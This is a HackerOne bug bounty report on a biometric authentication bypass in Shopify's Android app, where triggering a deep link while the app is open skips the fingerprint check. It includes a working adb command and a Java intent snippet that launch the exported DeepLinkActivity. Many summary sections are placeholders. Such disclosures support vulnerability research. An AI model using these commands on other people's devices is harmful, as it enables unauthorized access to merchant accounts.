# Bypass of biometrics security functionality is possible in Android application (com.shopify.mobile)

## Metadata
- **Source:** HackerOne
- **Report:** 637194 | https://hackerone.com/reports/637194
- **Submitted:** 2019-07-07
- **Reporter:** tiago-danin
- **Program:** Unknown
- **Bounty:** $500
- **Severity:** low
- **Vuln:** Improper Authentication - Generic
- **CVEs:** None
- **Category:** auth-crypto

## Summary
# Summary
Shopify Android App has an option to sign in to the app using fingerprint. But if the application was open and someone triggers a "deeplink", authentication is no longer required.

## Step to Reproduce
{F523700}
Link: [Shopify Help Center - Topics - Products](https://help.shopify.com/en/manual/products)

NOTE¹: The application must be **open** when triggered `com.shopify.mobile.lib.app.D

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

# Summary
Shopify Android App has an option to sign in to the app using fingerprint. But if the application was open and someone triggers a "deeplink", authentication is no longer required.

## Step to Reproduce
{F523700}
Link: [Shopify Help Center - Topics - Products](https://help.shopify.com/en/manual/products)

NOTE¹: The application must be **open** when triggered `com.shopify.mobile.lib.app.DeepLinkActivity`.
NOTE²: It is also possible via ADB and Java (Android App):
`adb shell am start -n com.shopify.mobile/com.shopify.mobile.lib.app.DeepLinkActivity -d 'https://www.shopify.com/admin/products'`
```java
Intent intent = new Intent();
intent.setClassName("com.shopify.mobile", "com.shopify.mobile.lib.app.DeepLinkActivity");
intent.setData(Uri.parse("https://www.shopify.com/admin/products")); 
startActivity(intent);
```

My environment information:
{F523698} {F523699}

## Impact

Unauthorized access to use the application.

</details>

---
*Analysed by Claude on 2026-05-24*
